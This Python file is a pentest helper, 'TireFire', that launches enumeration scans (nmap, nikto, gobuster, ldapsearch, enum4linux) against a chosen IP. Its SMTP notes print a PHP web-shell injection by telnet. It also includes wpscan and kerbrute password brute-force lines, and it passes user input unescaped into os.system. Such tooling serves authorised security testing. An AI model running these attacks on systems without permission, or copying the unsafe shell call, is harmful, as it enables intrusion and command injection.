#!/usr/bin/python3
import os
import subprocess
import sys
from colorama import Fore, Style

#TireFire is a 19% Security Solution Created by CoolHandSquid and inspired by MaBraFoo


"""
When making a function, be sure to add it into home_lst<<<<<<<<<<<<<<<<<<<<<<
def nmap():					##function name
	nmap_title	= "nmap"	##function title should match the name
	nmap_comment= "#####"	##comment can be ##### or it can be something else, just a comment.
	nmap_lst	= ["SquidsSmartScan", "Quick Scan", "Version Scan", "All Port Scan", "All Vulns Scan"]	##lst will be the list printed to screen to choose from
	nmap 		= Display_class(nmap_title, nmap_comment, nmap_lst)	## needed to create the object nmap
	scan 		= Display(nmap)	##This will be passed and make the variable "scan" a number corresponding to something in lst. 
"""

#Details
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
#Classes and Variable Declarations Begin

class Display_class:
	def __init__(self, title, comment, lst):
		self.title		= title
		self.comment 	= comment	
		self.lst 		= lst

home_title	= "Home"
home_comment= "#####"
home_lst	= ["nmap()", "dns()", "smtp()","web()", "webapp()", "kerberos()", "smb()", "ldap()", "mysql()", "oracle()", "ProtoBrute()"]
home 		= Display_class(home_title, home_comment, home_lst)

yes		= [ "yes","y", "yee yee", "yee", "yeah", "yeet", "yeet cannon", "yea", "yeah", "ye"]
no 		= [ "no", "n", "nah", "fuckyou"]
tfpath 	= subprocess.getoutput("readlink /usr/bin/TireFire")
tfpath	= tfpath[:-12]

#Variable Declarations End
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
#Main Modules Begin
def nmap():
	nmap_title	= "nmap"
	nmap_comment= "#####"
	nmap_lst	= ["SquidsSmartScan", "Quick Scan", "Version Scan", "All Port Scan", "All Vulns Scan", "Quiet Scan", "UDP Scan"]
	nmap 		= Display_class(nmap_title, nmap_comment, nmap_lst)
	scan 		= Display(nmap)

	if scan		== 1:
		#SquidsSmartScan
		command = "echo 'nmap -Pn -sS -p- {} && nmap -Pn {} && nmap -sC -sV -Pn {} && nmap -p- -Pn {} && sudo nmap -Pn -p- -sU {}'".format(ip, ip, ip, ip, ip, ip)
	elif scan 	== 2:
		#Quick Scan
		command = "nmap {}".format(ip)
	elif scan 	== 3:
		#Version Scan
		command = "nmap -sC -sV {}".format(ip)
	elif scan 	== 4:
		#All Port Scan
		command = "nmap -p- -Pn {}".format(ip)
	elif scan 	== 5:
		#All Vulns Scan
		command = "nmap --script smb-vuln* -p 139,445 {}".format(ip)
	elif scan 	== 6:
		#Quiet scan
		command = "echo 'sudo nmap -Pn -sS -p- {}'".format(ip)
	elif scan 	== 7:
		#UDP scan
		command = "echo sudo 'nmap -Pn -p- -sU {}'".format(ip)
	doit(command)

def smtp():
	smtp_title	= "smtp"
	smtp_comment= "#####"	
	smtp_lst	= ["SmtpVulnNmap", "SmtpUserEnum", "SmtpManualEnumNotes"]
	smtp 		= Display_class(smtp_title, smtp_comment, smtp_lst)
	scan 		= Display(smtp)

	if scan 	== 1:
	#Smtp Vuln Nmap
		command = "nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {}".format(ip)
	if scan 	== 2:
		#Smtp User Enum
		command = "smtp-user-enum -M VRFY -U /usr/share/wfuzz/wordlist/others/names.txt -t {}".format(ip)
	if scan 	== 3:
		print("""
root@kali:~# telnet 10.10.10.7 25
Trying 10.10.10.7...
Connected to 10.10.10.7.
Escape character is '^]'.
220 beep.localdomain ESMTP Postfix
EHLO coolhandsquid.au
250-beep.localdomain
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN
VRFY asterisk@localhost  
252 2.0.0 asterisk@localhost
mail from:coolhandsquid@step-child.au
250 2.1.0 Ok
rcpt to:asterisk@localhost
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
Subject: You got owned
<?php echo system($_REQUEST['squid']); ?>

.
250 2.0.0 Ok: queued as 84C50D92F8
^C
^]
telnet> quit
""")
	doit(command)

def dns():
	dns_title	= "dns"
	dns_comment= "#####"
	dns_lst	= ["SquidsDnsTool"]
	dns 		= Display_class(dns_title, dns_comment, dns_lst)
	scan 		= Display(dns)

	if scan 	== 1:
		#SquidsDnsTool
		dn 		= input("What is your best guest at a domain name? (Example: yeet.wtf)\n> ")
		command = "SquidsDnsTool {} {}".format(ip, dn)
	doit(command)

def web():
	web_title	= "web"
	web_comment= "#####"
	web_lst	= ["QuickWebScan", "SquidsSqlMapTool", "SquidsWfuzzTool", "nikto", "Directory Brute Force", "CGI Brute Force", "nmap VulnScan", "Squids ShellShock NSE"]
	web 		= Display_class(web_title, web_comment, web_lst)
	create_portlist()
	scan 		= Display(web)
	#create_portlist will only create the portlist one time. 
	#Select_port will return a dictionary with the keyname being the port and the value being the protocol (http or https)
	
	if scan 	== 1:
		#QuickWebScan
		portdict = select_port()
		for port, protocol in portdict.items():
			command		= "nikto -host {}://{}:{}".format(protocol, ip, port, ip, port)
			doit(command)
			command 	= "gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u {}://{}:{} && gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u {}://{}:{}".format(protocol, ip, port, protocol, ip, port)
			doit(command)
			command		= "nmap -vv --reason -Pn -sV -p {} --script=`banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)` {}".format(port, ip)
			doit(command)
	elif scan 	== 2:
		#SquidsSqlMapTool
		command = "SquidsSqlMapTool"
		doit(command)
	elif scan 	== 3:
		#SquidsWfuzzTool
		command = "SquidsWfuzzTool"
		doit(command)
	elif scan 	== 4:
		#nikto
		portdict = select_port()
		for port, protocol in portdict.items():
			command = "nikto -host {}://{}:{}".format(protocol, ip, port)
			doit(command)
	elif scan 	== 5:
		#directory brute force
		portdict = select_port()
		for port, protocol in portdict.items():
			q1	= input("Would you like this scan on port {} to be recursive?\n> ".format(port))
			if q1 in yes:
				command = "python3 {}/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -e php,exe,sh,py,html,pl -f -t 20 -u {}://{}:{} -r -R 10".format(tfpath, protocol, ip, port)
				doit(command)
			else:
				command	= "gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u {}://{}:{}".format(protocol, ip, port)
				doit(command)
		return
	elif scan 	== 6:
		#directory brute force for cgi
		portdict = select_port()
		for port, protocol in portdict.items():
			command = "gobuster dir -u {}://{}:{}/ -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -s 200".format(protocol, ip, port)
			doit(command)
	elif scan 	== 7:
		#nmap VulnScan
		portdict = select_port()
		for port, protocol in portdict.items():
			command = "nmap -vv --reason -Pn -sV -p {} --script=`banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)` {}".format(port, ip)
			doit(command)
	elif scan 	== 8:
		#Squids ShellShock NSE
		for port in portlist:
			command = "nmap -vv --reason -Pn -sV -p {} --script={}/http-shellshock.nse {}".format(port, tfpath, ip)
			doit(command)
	return

def webapp():
	webapp_title	= "webapp"
	webapp_comment	= "Drupwn, joomlavs and joomblah are not currently in the build script"
	webapp_lst		= ["wpscan", "drupwn", "joomlavs", "joomblah"]
	webapp 			= Display_class(webapp_title, webapp_comment, webapp_lst)
	scan 			= Display(webapp)

	q1	= input("Where is the webapp located?\nExample Syntax	192.168.11.137:8000/wordpress\n> ")
	if scan 	== 1:
		#wpscan
		command = "wpscan --url http://{} --enumerate ap,at,cb,dbe && wpscan --url http://{} --enumerate u,tt,t,vp --passwords /usr/share/wordlists/rockyou.txt -e ".format(q1, q1)
	elif scan 	== 2:
		#recomended tools for drupal
		command		= "echo 'git clone https://github.com/immunIT/drupwn.git for low hanging fruit and git clone https://github.com/droope/droopescan.git for the deeper shit.'".format(q1) 
	elif scan == 3:
		#probably busted
		command		= "ruby joomlavs.rb -u http://{} --scan-all | tee 'joomlahvs_{}'".format(q1)
	elif scan == 4:
		#probably busted
		command		= "python joomblah.py http://{} | tee 'joomblah_{}'".format(q1)
		return
	doit(command)

def kerberos():
	kerberos_title 		= "kerberos"
	kerberos_comment 	= "#####"
	kerberos_lst 		= ["Pre Creds", "With Users", "With Creds"]
	kerberos 			= Display_class(kerberos_title, kerberos_comment, kerberos_lst)
	scan 				= Display(kerberos)

	dn = "yeet.local"
	q1 = input("What is the domain name? Example: yeet.local")
	if scan == 1:
		#Pre Creds
		command = "nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='{}',userdb=/usr/share/seclists/Usernames/Names/names.txt {}".format(dn, ip)
	if scan == 2:
		#With Users
		command = "./kerbrute_linux_amd64 bruteuser --dc 10.11.1.220 -d thinc.local /Yeet/Tools/Wordlists/rockyou.txt kevin@thinc.local"


def smb():
	smb_title	= "smb"
	smb_comment= "#####"
	smb_lst	= ["All", "Enum4Linux", "SmbVulnNmapScan", "SmbVersionEnum","SquidsSmbTool"]
	smb 		= Display_class(smb_title, smb_comment, smb_lst)
	scan 		= Display(smb)

	if scan 	== 1:
		dn 		= input("What is the domain/workgroup? (example yeet.wtf)\n> ")
		command = "enum4linux -a {}".format(ip)
		doit(command)
		command	= "nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {}".format(ip)
		doit(command)
		command = "echo 'sudo {}/SmbVersionEnum.sh {} 139'".format(tfpath, ip)
		doit(command)
		command = "SquidsSmbTool {} {}".format(ip, dn)
	if scan 	== 2:
		#Enum4Linux
		command = "enum4linux -a {}".format(ip)
	elif scan 	== 3:
		#SmbVulnNmapScan
		command	= "nmap --script smb-vuln* -Pn -p 139,445 {}".format(ip)
	elif scan 	== 4:
		#must be run as root becasues the tool calls tcpdump. You may have to adjust your nic in the script manually.
		command = "echo 'sudo {}/SmbVersionEnum.sh {} 139'".format(tfpath, ip)
	elif scan 	== 5:
		#SquidsSmbTool
		dn 		= input("What is the domain/workgroup? (example yeet.wtf)\n> ")
		command = "SquidsSmbTool {} {}".format(ip, dn)
	doit(command)

def ldap():
	ldap_title	= "ldap"
	ldap_comment= "Grep Through BigDump to make a userlist"
	ldap_lst 	= ["ldap nmap scan", "ldapsearch", "ldapsearch_NamingContextsDump", "ldapsearch_BigDump"]
	ldap 		= Display_class(ldap_title, ldap_comment, ldap_lst)
	scan 		= Display(ldap)

	global nc
	try:
		q1 = input("Do you want to change the namingcontext? (Yes or No)\nIt is currently {}\n> ".format(nc))
	except NameError:
		nc = "DC=YeetCannon,DC=local"			
		q1 = input("Do you want to change the namingcontext?\nIt is currently {}\n> ".format(nc))
	if q1 in yes:
		nc = input("What is the namingcontext? (Example Syntax: DC=YeetCannon,DC=local)\n> ")
	if scan 	== 1:
		command = "nmap -p 389 --script ldap-search -Pn {}".format(ip)
	elif scan 	== 2:
		command = "ldapsearch -h {} -x".format(ip)
	elif scan 	== 3:
		command = "ldapsearch -h {} -x -s base namingcontexts".format(ip)
	elif scan 	== 4:
		command = "ldapsearch -h {} -x -b '{}'".format(ip, nc)
	doit(command)

def mysql():
	mysql_title 	= "mysql"
	mysql_comment 	= "#####"
	mysql_lst 		= ["mysqlVulnNmap"]
	mysql 			= Display_class(mysql_title, mysql_comment, mysql_lst)
	scan 			= Display(mysql)

	if scan  == 1:
		command = "nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse {} -p 3306".format(ip)
	doit(command)

def oracle():
	oracle_title	= "oracle"
	oracle_comment	= "Just directions to download and install odat"
	oracle_lst		= ["Directions"]
	oracle 			= Display_class(oracle_title, oracle_comment, oracle_lst)
	scan 			= Dispay(oracle)

	if scan == 1:
		odat = """
navigate to https://github.com/quentinhardy/odat/releases/
download the latest
tar -xvf odat-linux-libc2.12-x86_64.tar.gz
cd odat-libc2.12-x86_64/
./odat-libc2.12-x86_64 all -s 10.10.10.82

for more details check https://github.com/quentinhardy/odat/wiki
"""
		command = "echo {}".format(odat)
		doit(command)

def ProtoBrute():
	ProtoBrute_title	= "ProtoBrute"
	ProtoBrute_comment= "#####"
	ProtoBrute_lst	= ["SquidsProtoBrute"]
	ProtoBrute 		= Display_class(ProtoBrute_title, ProtoBrute_comment, ProtoBrute_lst)
	scan 		= Display(ProtoBrute)

	if scan 	== 1:
		#SquidsProtoBrute
		command = "SquidsProtoBruteTool {}".format(ip)
	doit(command)

#Main Modules End
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
#WEB Extra Stuff BEGIN
def create_portlist():
	#creates portlist once, then is passed.
	global portlist
	try:
		null = len(portlist)
		return
	except:
		portlist = ["All"]
		port 	= input("""
What is the port of the machine that we will be enumerating?
Example Syntax: 8000
> """)
		portlist.append(port)
		while True:	
			q1	= input("Add another port? (q if your list is complete)\n> ")
			if q1.lower() == "q":
				break
			else:
				try:
					port = str(int(q1))
					portlist.append(port)
					continue
				except:
					print("That looks like bad input. Lets try again.")
					continue
	return portlist

def select_port():
	#gives the opportunity to select a single port or all of them and then dynamicaly assigns either http or https
	while True:
		num = 1
		portdict = {}
		if len(portlist) == 2:
			q1 = 2
			break
		else:
			print("Which of these ports would you like to scan against?(left number please)")
			for i in portlist:
				print("{}. {}".format(num, i))
				num += 1
			try:
				q1 = int(input("> "))
				break
			except KeyboardInterrupt:
				quit()
			except:
				print("Bad input homie. Lets try again.")
				continue
			if q1 not in range(len(portlist)):
				print("Bad input homie. Lets try again.")
				continue
	q1 = q1 - 1		
	port = portlist[q1]
	print(port)
	if port == "All":
		for i in portlist:
			if i == "All":
				continue
			if i == "443" or i == "8443":
				portdict[i] = "https"
			else:
				portdict[i] = "http"
	elif port == "443" or port == "8443":
		portdict[port] = "https"
	else:
		portdict[port] = "http"
	return portdict

def dirsearch():
	#Just dirsearch, but too hefty to put in the main section
	q1	= input("Would you like this scan to be recursive?\n> ")
	if len(portlist) != 1:
		print("What is the port of the machine that we will be enumerating?")
		number = 1
		for port in portlist:
			print("{}	{}:{}".format(number, ip, port))
			number += 1
		while True:
			try:	
				port	= int(input("> "))
				break
			except ValueError:
				print("Invalid input, try again... dirtbag")
				continue
		port -= 1
	else:
		port = 0
	port = portlist[port]
	if port == "443" or port == "8443":
		protocol = "https"
	else:
		protocol = "http"
	if q1 in yes:
		command = "python3 {}/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -e php,exe,sh,py,html,pl -f -t 20 -u {}://{}:{} -r -R 10".format(tfpath, protocol, ip, port)
	else:
		command	= "python3 {}/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u {}://{}:{}".format(tfpath, protocol, ip, port)
	doit(command)
	return
#WEB STUFF END
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
#Tire Fire Start Begin
def start():
	#Everything that happens before main() is called. IP is set here (can also be set manually at bottom of script to eliminate start())
	if termstat() == False:
		os.system("terminator -x 'TireFire'")
		print("Later Tater")
		quit()
	print("Welcome to TireFire!")
	sq1	= input("Would you like to kick this off with a netdiscover? (Not needed if you know what IP you are gonna be targeting)\n> ")
	sq1	= sq1.lower()
	if sq1 in yes:
		netdiscover()
	global ip
	ip 	= input("""
What is the IP of the machine that we will be enumerating?
Example Syntax:	192.168.11.137
> """)
	sq2	= input("Would you like to start a nmap scan?\n> ")
	if sq2 in yes:
		qwsq1		= os.popen("ping -c 1 {}".format(ip)).read()
		ttl			= qwsq1.split()[12]
		ttl_table= """
Operating System 	TCP	UDP 	ICMP
Linux			64	64	255
OS/2			64	64	255
Solaris 2.x		255	255	255				
MS Windows 95-ME	32	32	255
MS WIndows 		128	128	255
Windows Other		128	128	255
"""
		print(Fore.RED + "**Ping Hop Table**")
		print(Fore.YELLOW + ttl_table + Fore.WHITE)
		command	= "echo -e \"\\e[5m\\e[31m\\e[1m{}\\e[0m\"; echo \"http://www.kellyodonnell.com/content/determining-os-type-ping\" ; nmap -Pn {} && nmap -sC -sV -Pn {} && nmap -p- -Pn {} && nmap -Pn -p- -sU {}".format(ttl, ip, ip, ip, ip)
		doit(command)
		main()
	else:
		main()

def termstat():
	#used to determine if your terminator session will be able to execute --new-tab 
	curuser	= subprocess.getoutput("id")
	pid	= os.getpid()
	if "uid=0(root)" not in curuser:
		return True
	ppid = subprocess.getoutput("ps -o ppid= {}".format(pid))
	gpid = subprocess.getoutput("ps -o ppid= {}".format(ppid))
	psline = subprocess.getoutput("ps -aux | grep {} | grep -v grep".format(gpid))
	if "terminator" not in psline:
		return False
	else:
		return True

def netdiscover():
	while True:
		q1	= input("What is the class C subnet you would like to scan?\nExample Syntax: 192.168.11.0\n> ")
		if q1[-1] == "0" and q1[-2] == ".":
			command = "sudo netdiscover -r {}".format(q1)
			break
		else:
			print("Some decent input would be nice... remember, a class c subnet will end with .0")
	doit(command)

#TireFire Start END
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
#Tire Fire Fundamentals Begin
def Display(foo):
	#used to create the list of options to choose from. Display() calls input_validation() to handle input properly.
	print(Fore.RED + foo.title)
	print(Fore.YELLOW + foo.comment + Fore.WHITE)
	for i in range(len(foo.lst)):
		print("{}. {}".format(i + 1, (foo.lst[i]).replace("()", "")))
	di1 = input_validation(foo) 
	if di1 == False:
		main()
	elif str(")") in foo.lst[di1-1]:
		eval((foo.lst[di1-1]))
	else:
		return di1

def input_validation(objec):
	#minimizes bad charachter errors in the main of the script.
	bad_input	= "Some decent input would be nice..."
	try:
		if len(objec.lst) <= 1:
			return 1
		else:
			foo = int(input("> "))
			if foo in range(len(objec.lst)+1):
				return foo
			else:
				print(bad_input)
				return False
	except KeyboardInterrupt:
		print("Later Tater")
		quit()
	except:
		print(bad_input)
		return False

def doit(command):
	#called to execute command in new terminator tab
	os.system("terminator --new-tab -x 'echo \"{}\"; {}; $SHELL'".format(command, command))
	print(Fore.GREEN + "{}\n".format(command))
	print(Style.RESET_ALL)
	return

def main():
	#duh
	while True:
		try:
			Display(home)
		except:
			quit()

#ip = "1.1.1.1"
start()
